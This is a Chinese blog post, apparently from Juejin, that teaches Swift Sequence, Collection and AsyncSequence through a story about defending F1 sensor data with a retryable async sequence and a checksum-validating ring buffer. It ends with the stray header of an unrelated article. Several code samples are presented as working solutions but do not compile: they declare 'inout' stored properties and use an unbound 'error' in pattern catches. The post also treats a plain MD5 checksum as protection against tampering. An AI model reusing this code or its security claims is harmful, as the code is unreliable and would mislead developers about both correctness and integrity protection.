<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b86b2f8effd34873ad9199535972bebe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=2LViD3R92VzlLvqpyiZg3ArWb3Y%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">错误传播的 “底层逻辑”</h3>
<p>先搞懂一个关键：<code>AsyncSequence</code>的错误是 “终止性的”—— 一旦<code>next()</code>抛出错误，整个迭代就会停止，就像赛车引擎爆缸后再也没法前进。比如传感器断连抛出<code>SensorDisconnectError</code>，<code>for try await</code>循环会立刻跳出，进入<code>catch</code>块，后续的元素再也接收不到。</p>
<p>看这个 “踩坑示例”：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 错误示范：粗暴重试导致重复数据</span>
<span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> <span class="hljs-type">SensorSequence</span>() {
            sensorBuffer.enqueue(data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"接收数据：<span class="hljs-subst">\(data)</span>"</span>)
        }
    } <span class="hljs-keyword">catch</span> <span class="hljs-keyword">is</span> <span class="hljs-type">SensorDisconnectError</span> {
        <span class="hljs-comment">// 断连后直接重试，却没记录“已接收的元素ID”</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"传感器断连，重试中..."</span>)
        <span class="hljs-keyword">await</span> retrySensorSequence() <span class="hljs-comment">// 重试时会重新接收之前已处理的元素</span>
    }
}
</code></pre>
<p>这段代码的问题在于：重试时会生成<strong>全新的异步迭代器</strong>，它不知道之前已经接收过哪些元素，导致 “旧数据重复入队”—— 这正是 “迭代异常兽” 想要的结果。</p>
<h3 data-id="heading-2">精准重试：给迭代器加 “记忆功能”</h3>
<p>杰西的解决方案是：自定义一个<code>RetryableSensorSequence</code>，给异步迭代器加 “元素 ID 记忆”，重试时跳过已处理的元素，就像赛车在维修后重回赛道，能精准接上之前的位置继续跑。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3dc9140ed6545848f14851214cf4eb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=65BrhpIa8atU9GsAHYH4duaVhFM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 带“记忆功能”的可重试异步序列</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">RetryableSensorSequence</span>: <span class="hljs-title class_">AsyncSequence</span> {
    <span class="hljs-keyword">typealias</span> <span class="hljs-type">Element</span> <span class="hljs-operator">=</span> <span class="hljs-type">SensorData</span> <span class="hljs-comment">// 传感器数据（含唯一ID和校验码）</span>
    <span class="hljs-keyword">typealias</span> <span class="hljs-type">AsyncIterator</span> <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorIterator</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> baseSequence: <span class="hljs-type">SensorSequence</span> <span class="hljs-comment">// 原始传感器序列</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> processedIDs: <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-operator">=</span> [] <span class="hljs-comment">// 记录已处理的元素ID（防重复）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxRetries: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span> <span class="hljs-comment">// 最大重试次数（避免无限循环）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentRetry: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-comment">// 当前重试次数</span>

    <span class="hljs-keyword">init</span>(<span class="hljs-params">baseSequence</span>: <span class="hljs-type">SensorSequence</span>) {
        <span class="hljs-keyword">self</span>.baseSequence <span class="hljs-operator">=</span> baseSequence
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeAsyncIterator</span>() -&gt; <span class="hljs-type">RetryableSensorIterator</span> {
        <span class="hljs-type">RetryableSensorIterator</span>(
            baseIterator: baseSequence.makeAsyncIterator(),
            processedIDs: <span class="hljs-operator">&amp;</span>processedIDs,
            maxRetries: maxRetries,
            currentRetry: <span class="hljs-operator">&amp;</span>currentRetry
        )
    }

    <span class="hljs-comment">// 带记忆功能的异步迭代器</span>
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">RetryableSensorIterator</span>: <span class="hljs-title class_">AsyncIteratorProtocol</span> {
        <span class="hljs-keyword">typealias</span> <span class="hljs-type">Element</span> <span class="hljs-operator">=</span> <span class="hljs-type">SensorData</span>
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> baseIterator: <span class="hljs-type">SensorSequence</span>.<span class="hljs-type">AsyncIterator</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> processedIDs: <span class="hljs-keyword">inout</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-comment">// 引用外部的已处理ID集合</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxRetries: <span class="hljs-type">Int</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentRetry: <span class="hljs-keyword">inout</span> <span class="hljs-type">Int</span>

        <span class="hljs-keyword">mutating</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">next</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">SensorData</span>? {
            <span class="hljs-keyword">do</span> {
                <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> baseIterator.next() <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> <span class="hljs-comment">// 序列正常结束</span>
                }
                <span class="hljs-comment">// 关键：检查元素ID是否已处理，避免重复</span>
                <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>processedIDs.contains(data.id) <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> next() <span class="hljs-comment">// 跳过重复元素，继续获取下一个</span>
                }
                processedIDs.insert(data.id) <span class="hljs-comment">// 记录已处理的ID</span>
                <span class="hljs-keyword">return</span> data
            } <span class="hljs-keyword">catch</span> <span class="hljs-keyword">is</span> <span class="hljs-type">SensorDisconnectError</span> {
                <span class="hljs-comment">// 达到最大重试次数，抛出最终错误</span>
                <span class="hljs-keyword">guard</span> currentRetry <span class="hljs-operator">&lt;</span> maxRetries <span class="hljs-keyword">else</span> {
                    currentRetry <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-comment">// 重置重试次数，方便后续复用</span>
                    <span class="hljs-keyword">throw</span> error <span class="hljs-comment">// 重试失败，终止迭代</span>
                }
                currentRetry <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"第<span class="hljs-subst">\(currentRetry)</span>次重试传感器连接..."</span>)
                <span class="hljs-comment">// 重建基础迭代器（重新连接传感器）</span>
                <span class="hljs-keyword">self</span>.baseIterator <span class="hljs-operator">=</span> <span class="hljs-type">SensorSequence</span>().makeAsyncIterator()
                <span class="hljs-comment">// 递归调用next()，继续迭代（不重复已处理元素）</span>
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> next()
            } <span class="hljs-keyword">catch</span> {
                <span class="hljs-comment">// 其他错误（比如数据格式错误），直接抛出</span>
                <span class="hljs-keyword">throw</span> error
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-3">实战效果：再也不重复，再也不丢失</h3>
<p>艾拉把这个 “带记忆的序列” 集成到系统后，效果立竿见影：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 正确姿势：用可重试序列消费传感器数据</span>
<span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">let</span> retryableSequence <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorSequence</span>(baseSequence: <span class="hljs-type">SensorSequence</span>())
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> retryableSequence {
            sensorBuffer.enqueue(data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"安全接收数据：<span class="hljs-subst">\(data)</span>（ID：<span class="hljs-subst">\(data.id)</span>）"</span>)
        }
    } <span class="hljs-keyword">catch</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"最终失败：<span class="hljs-subst">\(error)</span>，已触发备用传感器"</span>)
    }
}
</code></pre>
<p>当传感器断连时，序列会自动重试（最多 3 次），且重试后绝不会重复接收旧数据 —— 因为<code>processedIDs</code>会牢牢记住 “哪些数据已经处理过”。就像赛车在维修区快速换胎后，能精准回到赛道的正确位置，既不落后，也不跑偏。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/832ed2ad1566491297ab477c29983d1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=1rZ4a90yK9%2Bz7N2hjzG%2FADLT8LE%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-4">🛡️ 第二重防线：给 SafeRingBuffer 加 “数据校验锁”</h2>
<p>解决了重复问题，下一个目标是 “数据篡改”——“迭代异常兽” 会修改传感器数据的校验码，让错误数据混入缓冲区。杰西的方案是：给<code>SafeRingBuffer</code>升级，在 “入队” 和 “访问” 时双重校验数据完整性，就像给赛车装 “指纹锁”，不是自己人的数据，一概不让进。</p>
<h3 data-id="heading-5">校验逻辑：哈希值是 “数据身份证”</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5cc302dcd644aebbf01a7376a295f3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=TbpPs%2FVomi9llBioH%2FeZaaiRBBM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>传感器数据会自带一个<code>checksum</code>（哈希值），计算规则是 “数据内容 + 时间戳” 的 MD5 值。<code>SafeRingBuffer</code>在入队时要验证这个哈希值，不匹配就拒绝入队；在访问时再二次校验，确保数据没被篡改。</p>
<h4 data-id="heading-6">升级后的 SafeRingBuffer（核心校验代码）</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SafeRingBuffer</span>&lt;<span class="hljs-title class_">Element</span>: <span class="hljs-title class_">DataVerifiable</span>&gt;: <span class="hljs-title class_">Collection</span> {
    <span class="hljs-comment">// 新增约束：Element必须遵守DataVerifiable协议（有校验能力）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> storage: [<span class="hljs-type">Element</span>?]
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> head <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> tail <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> lock <span class="hljs-operator">=</span> <span class="hljs-type">NSLock</span>()

    <span class="hljs-comment">// 入队时校验：篡改的数据直接拒之门外</span>
    <span class="hljs-keyword">mutating</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">enqueue</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">element</span>: <span class="hljs-type">Element</span>) <span class="hljs-keyword">throws</span> {
        lock.lock()
        <span class="hljs-keyword">defer</span> { lock.unlock() }

        <span class="hljs-comment">// 关键：验证数据哈希值，不匹配则抛出“数据篡改错误”</span>
        <span class="hljs-keyword">guard</span> element.verifyChecksum() <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-type">DataTamperingError</span>.invalidChecksum(
                <span class="hljs-string">"数据校验失败，ID：<span class="hljs-subst">\(element.id)</span>，可能被篡改"</span>
            )
        }

        storage[tail] <span class="hljs-operator">=</span> element
        tail <span class="hljs-operator">=</span> (tail <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-operator">%</span> storage.count

        <span class="hljs-keyword">if</span> count <span class="hljs-operator">==</span> storage.count {
            head <span class="hljs-operator">=</span> (head <span class="hljs-operator">+</span> <span class="hljs-number">1</span>) <span class="hljs-operator">%</span> storage.count
        } <span class="hljs-keyword">else</span> {
            count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
        }
    }

    <span class="hljs-comment">// 下标访问时二次校验：防止缓冲区内部数据被篡改</span>
    <span class="hljs-keyword">subscript</span>(<span class="hljs-params">position</span>: <span class="hljs-type">Index</span>) -&gt; <span class="hljs-type">Element</span> {
        lock.lock()
        <span class="hljs-keyword">defer</span> { lock.unlock() }

        <span class="hljs-built_in">precondition</span>((<span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span>count).contains(position), <span class="hljs-string">"索引超出范围"</span>)
        <span class="hljs-keyword">let</span> actualPosition <span class="hljs-operator">=</span> (head <span class="hljs-operator">+</span> position) <span class="hljs-operator">%</span> storage.count
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> element <span class="hljs-operator">=</span> storage[actualPosition] <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">preconditionFailure</span>(<span class="hljs-string">"缓冲区数据丢失，位置：<span class="hljs-subst">\(actualPosition)</span>"</span>)
        }

        <span class="hljs-comment">// 二次校验：确保数据在缓冲区中没被篡改</span>
        <span class="hljs-built_in">precondition</span>(element.verifyChecksum(), <span class="hljs-string">"缓冲区数据被篡改，ID：<span class="hljs-subst">\(element.id)</span>"</span>)
        <span class="hljs-keyword">return</span> element
    }
}

<span class="hljs-comment">// 数据校验协议：所有需要校验的数据都要遵守</span>
<span class="hljs-keyword">protocol</span> <span class="hljs-title class_">DataVerifiable</span> {
    <span class="hljs-keyword">var</span> id: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> } <span class="hljs-comment">// 唯一ID</span>
    <span class="hljs-keyword">var</span> checksum: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> } <span class="hljs-comment">// 数据哈希值</span>
    <span class="hljs-comment">// 校验方法：计算当前数据的哈希值，和自带的checksum对比</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">verifyChecksum</span>() -&gt; <span class="hljs-type">Bool</span>
}

<span class="hljs-comment">// 传感器数据实现校验协议</span>
<span class="hljs-keyword">extension</span> <span class="hljs-title class_">SensorData</span>: <span class="hljs-title class_">DataVerifiable</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">verifyChecksum</span>() -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// 计算“内容+时间戳”的MD5哈希值（真实项目中建议用更安全的SHA256）</span>
        <span class="hljs-keyword">let</span> calculatedChecksum <span class="hljs-operator">=</span> <span class="hljs-string">"<span class="hljs-subst">\(content)</span>-<span class="hljs-subst">\(timestamp)</span>"</span>.md5()
        <span class="hljs-keyword">return</span> calculatedChecksum <span class="hljs-operator">==</span> <span class="hljs-keyword">self</span>.checksum
    }
}

<span class="hljs-comment">// 自定义错误：数据篡改错误</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">DataTamperingError</span>: <span class="hljs-title class_">Error</span> {
    <span class="hljs-keyword">case</span> invalidChecksum(<span class="hljs-type">String</span>)
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe4917dea20e4c8fa13e96c614e01bf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=hKXMib4yBDm175yMkDcpXI8OR%2Bg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-7">效果：“迭代异常兽” 的篡改彻底失效</h3>
<p>当 “迭代异常兽” 试图把篡改后的传感器数据（校验码不匹配）入队时，<code>enqueue</code>会直接抛出<code>DataTamperingError</code>，错误数据连缓冲区的门都进不了；就算它想偷偷修改缓冲区里的数据，<code>subscript</code>访问时的二次校验也会触发<code>preconditionFailure</code>，立刻暴露问题。</p>
<p>艾拉测试时故意注入一条篡改数据，系统瞬间弹出警告：“DataTamperingError：数据校验失败，ID：sensor_123，可能被篡改”—— 就像赛车的防盗系统检测到非法入侵，立刻锁死引擎，让 “小偷” 无从下手。</p>
<h2 data-id="heading-8">🏆 终局：组合拳粉碎 “迭代异常兽”</h2>
<p>解决了错误恢复和数据篡改，艾拉和杰西打出最后一套 “组合拳”：用<code>RetryableSensorSequence</code>处理异步错误，用<code>SafeRingBuffer</code>做数据缓存和校验，再配合一个 “监控 Task” 实时监控序列状态 —— 三者联动，形成无死角的防御网。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f42b5ca1a5147fa8687af3fd9bb4c89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=gLcjcdWAZaJ%2Bu9oftzKuUJd7c1w%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-9">完整流程代码（终局方案）</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 1. 创建带校验的环形缓冲区（容量10，只存合法数据）</span>
<span class="hljs-keyword">var</span> verifiedBuffer <span class="hljs-operator">=</span> <span class="hljs-type">SafeRingBuffer</span>&lt;<span class="hljs-type">SensorData</span>&gt;(capacity: <span class="hljs-number">10</span>)

<span class="hljs-comment">// 2. 创建可重试的传感器序列（防断连、防重复）</span>
<span class="hljs-keyword">let</span> sensorSequence <span class="hljs-operator">=</span> <span class="hljs-type">SensorSequence</span>()
<span class="hljs-keyword">let</span> retryableSequence <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorSequence</span>(baseSequence: sensorSequence)

<span class="hljs-comment">// 3. 主Task：消费序列，存入缓冲区</span>
<span class="hljs-keyword">let</span> mainTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> retryableSequence {
            <span class="hljs-keyword">do</span> {
                <span class="hljs-keyword">try</span> verifiedBuffer.enqueue(data)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"成功入队：ID=<span class="hljs-subst">\(data.id)</span>，转速=<span class="hljs-subst">\(data.engineRPM)</span>转"</span>)
                <span class="hljs-comment">// 实时更新仪表盘（只传合法数据）</span>
                <span class="hljs-keyword">await</span> dashboard.update(with: verifiedBuffer[verifiedBuffer.count <span class="hljs-operator">-</span> <span class="hljs-number">1</span>])
            } <span class="hljs-keyword">catch</span> <span class="hljs-type">DataTamperingError</span>.invalidChecksum(<span class="hljs-keyword">let</span> message) {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"拦截篡改数据：<span class="hljs-subst">\(message)</span>"</span>)
                <span class="hljs-comment">// 触发警报，记录日志</span>
                <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.high, message: message)
            }
        }
    } <span class="hljs-keyword">catch</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"迭代终止：<span class="hljs-subst">\(error)</span>"</span>)
        <span class="hljs-comment">// 重试失败，切换到备用传感器</span>
        <span class="hljs-keyword">await</span> switchToBackupSensor()
    }
}

<span class="hljs-comment">// 4. 监控Task：实时检查缓冲区状态，防止异常</span>
<span class="hljs-keyword">let</span> monitorTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
    <span class="hljs-keyword">while</span> <span class="hljs-operator">!</span><span class="hljs-type">Task</span>.isCancelled {
        <span class="hljs-keyword">guard</span> verifiedBuffer.count <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"警告：缓冲区为空，可能传感器无数据"</span>)
            <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.low, message: <span class="hljs-string">"缓冲区空"</span>)
            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">1_000_000_000</span>)
            <span class="hljs-keyword">continue</span>
        }
        <span class="hljs-comment">// 每1秒检查一次最新数据的时效性（防止数据过期）</span>
        <span class="hljs-keyword">let</span> latestData <span class="hljs-operator">=</span> verifiedBuffer[verifiedBuffer.count <span class="hljs-operator">-</span> <span class="hljs-number">1</span>]
        <span class="hljs-keyword">if</span> <span class="hljs-type">Date</span>().timeIntervalSince(latestData.timestamp) <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"警告：最新数据已过期，可能序列卡顿"</span>)
            <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.medium, message: <span class="hljs-string">"数据过期"</span>)
        }
        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">1_000_000_000</span>)
    }
}
</code></pre>
<h3 data-id="heading-10">剧情收尾：赛道恢复平静，迭代真相揭晓</h3>
<p>当这套组合拳部署完成后，赛车仪表盘的转速数据瞬间稳定下来 ——10000 转、10020 转、9980 转，每一个数字都精准跳动，控制室的警报声渐渐平息。艾拉看着屏幕上 “所有传感器正常” 的绿色提示，长舒一口气：“‘迭代异常兽’被打跑了？”</p>
<p>杰西笑着点开日志，里面全是 “拦截篡改数据”“重试成功” 的记录：“不是打跑，是它再也没法钻漏洞了。你看 ——AsyncSequence 的核心是‘错误可控’，Collection 的核心是‘数据可信’，迭代器的核心是‘状态独立’，只要守住这三个核心，再狡猾的问题也能解决。”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f87bd5000834169ad41c9bbd7cc0ae0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=l42wJ%2B39GjJSTLwxqVty%2FtuoEqk%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>突然，仪表盘弹出一条新消息：“检测到外部干扰源已断开连接”——“迭代异常兽” 彻底消失了。</p>
<p>赛道上，F1 赛车重新加速，引擎的轰鸣声再次变得均匀有力；屏幕前，艾拉和杰西相视一笑，他们不仅修复了系统，更摸清了 Swift 迭代的 “底层逻辑”。</p>
<h2 data-id="heading-11">📝 终极总结：Swift 迭代的 “黄金法则”</h2>
<ol>
<li><strong>Sequence 是 “入门契约”</strong>：只承诺 “能迭代一次”，适合懒加载、生成器场景，像 F1 的 “练习赛”—— 灵活但不追求稳定。</li>
<li><strong>Collection 是 “进阶契约”</strong>：多轮迭代、索引访问、数据稳定，适合需要反复操作的数据，像 F1 的 “正赛”—— 稳定且高效。</li>
<li><strong>AsyncSequence 是 “异步契约”</strong>：支持暂停、抛错，适合数据流场景，但要注意 “错误终止性” 和 “重试防重复”，像 F1 的 “夜间赛”—— 更复杂，但有专属的应对策略。</li>
<li><strong>迭代器的 “值语义优先”</strong>：尽量用 struct 实现迭代器，避免共享可变状态，就像赛车的 “独立操控系统”—— 互不干扰，安全可控。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc043a15ff8d4f1ba564566f02ea4d89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=BmhYXOVWjyb2nknjqfaZUY6AMOk%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>最后记住：Swift 的迭代看似简单，实则是 “协议驱动” 的精妙设计。当你写下<code>for item in list</code>时，背后是 Sequence、Collection、Iterator 的协同作战 —— 就像 F1 赛车的引擎、刹车、底盘完美配合，才能跑出最快的速度，也才能写出最稳定、最高效的代码。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/253bf7fec4ec44e8b1e3c8452905d398~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=8kSe9U2VE3lF6L6xAMXbkZLhv2o%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>那么，宝子们看到这里学到了吗？</p>
<p>感谢观赏，下次我们再会吧！8-)</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 模型占了 10G 显存，服务重启却没释放？]]></title>    <link>https://juejin.cn/post/7581765536372064265</link>    <guid>https://juejin.cn/post/7581765536372064265</guid>    <pubDate>2025-12-10T01:56:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372064265" data-draft-id="7581765536371965961" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 模型占了 10G 显存，服务重启却没释放？"/> <meta itemprop="keywords" content="AI编程,后端"/> <meta itemprop="datePublished" content="2025-12-10T01:56:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="lomocode"/> <meta itemprop="url" content="https://juejin.cn/user/2103792315926697"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 模型占了 10G 显存，服务重启却没释放？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2103792315926697/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    lomocode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:56:23.000Z" title="Wed Dec 10 2025 01:56:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
